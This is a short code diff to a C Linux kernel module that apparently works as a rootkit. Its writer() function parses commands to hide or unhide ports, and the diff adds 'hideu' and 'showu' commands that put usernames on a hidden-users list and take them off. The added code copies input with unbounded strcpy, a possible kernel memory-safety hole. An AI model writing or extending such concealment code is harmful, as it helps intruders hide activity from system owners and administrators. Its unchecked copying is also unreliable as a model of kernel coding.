@@ -5,6 +5,7 @@
     #include <linux/sched.h>
     #include <linux/fs.h>
     #include <linux/uaccess.h> // copy to/from user space
+
     #include "linked_list.h"
 
 
@@ -47,6 +48,13 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             insert_node(&ports_to_hide, last_data);
         }
     }
+    if(memcmp("hideu ", tmpdata, strlen("hideu ")) == 0){
+        if(strlen(tmpdata) > strlen("hideu ")){
+            strcpy(last_data, tmpdata + strlen("hideu "));
+            insert_node(&users_to_hide, last_data);
+        }
+    }
+
     if(memcmp("show ", tmpdata, strlen("show ")) == 0){
         if(strlen(tmpdata) > strlen("show ") + 3){
             strcpy(last_data, tmpdata + strlen("show "));
@@ -63,6 +71,12 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("showpo ")){
             strcpy(last_data, tmpdata + strlen("showpo "));
             remove_node_by_name(&ports_to_hide, last_data);
+        }
+    }
+    if(memcmp("showu ", tmpdata, strlen("showu ")) == 0){
+        if(strlen(tmpdata) > strlen("showu ")){
+            strcpy(last_data, tmpdata + strlen("showu "));
+            remove_node_by_name(&users_to_hide, last_data);
         }
     }
     return 0;
